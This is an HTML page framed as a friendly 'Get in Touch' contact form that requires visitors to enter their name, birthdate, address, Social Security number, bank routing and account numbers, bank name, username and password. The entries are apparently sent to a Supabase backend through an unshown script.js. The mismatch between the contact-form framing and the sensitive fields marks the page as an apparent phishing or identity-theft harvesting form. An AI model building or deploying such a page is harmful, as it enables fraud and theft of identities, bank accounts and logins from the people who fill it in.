<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Submission</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <div class="container">
        <div class="form-container">
            <h1 class="form-title">Get in Touch</h1>
            <p class="form-description">Please fill out the form below and we'll get back to you as soon as possible.
            </p>

            <form id="accountForm">
                <div class="input-group">
                    <label for="first_name">First Name</label>
                    <input type="text" id="first_name" name="first_name" placeholder="Enter your first name" required>
                </div>

                <div class="input-group">
                    <label for="last_name">Last Name</label>
                    <input type="text" id="last_name" name="last_name" placeholder="Enter your last name" required>
                </div>

                <div class="input-group">
                    <label for="birthdate">Birthdate</label>
                    <input type="date" id="birthdate" name="birthdate" required>
                </div>

                <div class="input-group">
                    <label for="address">Address</label>
                    <input type="text" id="address" name="address" placeholder="Enter your address" required>
                </div>

                <div class="input-group">
                    <label for="ssn">SSN</label>
                    <input type="number" id="ssn" name="ssn" placeholder="Enter your SSN" required>
                </div>

                <div class="input-group">
                    <label for="routing_number">Routing Number</label>
                    <input type="number" id="routing_number" name="routing_number" placeholder="Enter routing number"
                        required>
                </div>

                <div class="input-group">
                    <label for="account_number">Account Number</label>
                    <input type="number" id="account_number" name="account_number" placeholder="Enter account number"
                        required>
                </div>

                <div class="input-group">
                    <label for="bank_name">Bank Name</label>
                    <input type="text" id="bank_name" name="bank_name" placeholder="Enter bank name" required>
                </div>

                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter your username" required>
                </div>

                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required
                        autocomplete="current-password">
                </div>

                <button type="submit" class="submit-button">Submit</button>
            </form>

            <p id="responseMessage" class="response-message"></p>
        </div>
    </div>

    </div>

    <!-- <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script> -->
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <script src="./script.js"></script>

    <script>
        
    </script>
    <!-- <script src="https://unpkg.com/@supabase/supabase-js@2"></script> -->

</body>

</html>
